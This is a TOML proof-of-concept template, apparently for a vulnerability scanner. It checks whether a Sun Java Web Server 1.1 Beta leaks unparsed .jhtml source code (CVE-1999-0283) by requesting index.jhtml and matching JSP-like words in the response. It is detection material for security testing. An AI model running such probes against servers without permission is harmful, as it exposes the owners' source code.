[info]
author = "ave"
description = "检测 Sun Java Web Server 1.1 Beta 是否存在 .jhtml 源代码泄露漏洞，通过请求 .jhtml 文件验证是否返回未解析的源代码"
id = "POC-AVE-1999-0472"
name = "Sun Java Web Server .jhtml Source Code Disclosure PoC"
severity = "critical"
tags = ["ave-1999-0472"]
vuln_id = [
    "CVE-1999-0283",
    "AVE-1999-0472",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/index.jhtml"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "java",
    "import",
]
